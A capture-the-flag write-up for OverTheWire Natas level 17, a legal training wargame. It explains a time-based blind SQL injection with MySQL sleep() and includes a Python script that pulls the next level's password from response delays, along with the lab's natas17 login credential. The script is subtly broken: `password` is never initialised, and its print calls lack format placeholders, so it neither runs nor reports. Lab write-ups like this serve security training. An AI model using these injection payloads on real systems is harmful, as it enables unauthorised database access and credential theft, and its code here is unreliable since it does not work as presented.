# Level 17

**URL: http://natas17.natas.labs.overthewire.org/**



## Solution

This challenge is the same challenge as the previous blind-based SQL injection challenge, except this time there is no output.

let's drop the source code.

```php
<?  
  
/*  
CREATE TABLE `users` (  
  `username` varchar(64) DEFAULT NULL,  
  `password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {  
    $link = mysql_connect('localhost', 'natas17', '<censored>');  
    mysql_select_db('natas17', $link);  
      
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }  
  
    $res = mysql_query($query, $link);  
    if($res) {  
    if(mysql_num_rows($res) > 0) {  
        //echo "This user exists.<br>";  
    } else {  
        //echo "This user doesn't exist.<br>";  
    }  
    } else {  
        //echo "Error in query.<br>";  
    }  
  
    mysql_close($link);  
} else {  
?>   

```

we can see two important things :

1. a `users` table with 2 columns (`username`, `password`)
2. There is no output no matter what input we provide.


We can force the SQL query to reveal more informations using the MySQL [sleep()](https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html) function.  

- input:  **natas18" and sleep(3) #**

if the query takes more than 3 seconds to execute, then it means that username `natas18` exists and sleep(3) got executed successfully!  

So we will  bruteforce the password character by character.According to the response time we can accept or reject characters.

here is the script.

```python
#!/usr/bin/python3

# coding : utf-8


import requests
import string

pass_charset = string.ascii_letters + string.digits
URL = "http://natas17.natas.labs.overthewire.org"

session = requests.Session()
session.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
payload = {'username': ''}
reduced_charset = ""

time_list = []

# determine only characters present in password, to reduce time
for c in pass_charset:
    payload["username"] = 'natas18" AND password LIKE BINARY "%{}%" AND sleep(1)#'.format(c)
    r = session.post(URL, data=payload)
    if r.elapsed.total_seconds() >= 1:
        reduced_charset += c

print("reduced character set : ".format(reduced_charset))

for i in range(1, 32+1):
    for c in reduced_charset:
        payload["username"] = 'natas18" and strcmp(BINARY substr(password, {}, 1), "{}") = 0 and sleep(1)#'.format(i, c)
        res = session.post(URL, data=payload)
        if res.elapsed.total_seconds() >= 1:
            password += c

print("flag is : ".format(password))


#print("guessed char: {}".format(pass_charset[time_list.index(max(time_list))]))

```

















